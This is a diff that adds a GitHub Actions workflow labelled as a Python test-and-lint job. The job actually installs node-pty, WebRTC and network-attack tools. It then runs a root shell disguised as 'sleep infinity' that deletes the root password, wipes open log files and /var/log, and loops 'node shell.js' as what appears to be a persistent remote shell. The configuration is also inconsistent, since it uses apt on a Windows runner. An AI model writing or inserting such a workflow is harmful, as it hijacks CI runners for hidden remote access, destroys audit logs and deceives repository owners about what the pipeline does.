@@ -1,0 +1,51 @@
+# This workflow will install Python dependencies, run tests and lint with a single version of Python
+# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python
+
+name: Python application 3
+
+on:
+  workflow_dispatch:
+    inputs:
+      data:
+        # Friendly description to be shown in the UI instead of 'name'
+        description: 'Input string'
+        # Default value if no value is explicitly provided
+        default: ''
+        # Input has to be provided for the workflow to run
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: "3.10"
+    - name: Install dependencies
+      run: |
+        npm install node-pre-gyp wrtc node-pty
+        sudo apt update &>/dev/null
+        sudo apt install iputils-ping dnsutils nmap tcpdump net-tools inetutils-traceroute mtr whois curl wget bind9-host iproute2 iftop hping3 ngrep nano aria2 coturn cowsay neofetch strace &>/dev/null
+    - name: Run
+      run: |
+        exec -a "sleep infinity" sudo -sH &>/dev/null <<EOF
+        killall -9 turnserver
+        passwd -d root
+        touch ~root/.hushlogin
+        cat logo.txt >/etc/issue
+        ln -sf /usr/share/zoneinfo/Africa/Cairo /etc/localtime
+        lsof -Fn | grep -F '.log' | grep -v deleted | awk '/^n/ {print substr(\$0, 2)}' | xargs -I {} rm -rf {}
+        rm -rf /var/log/*
+        while true
+        do
+        node shell.js -r -l -t 600 github3
+        sleep 2
+        done
+        EOF
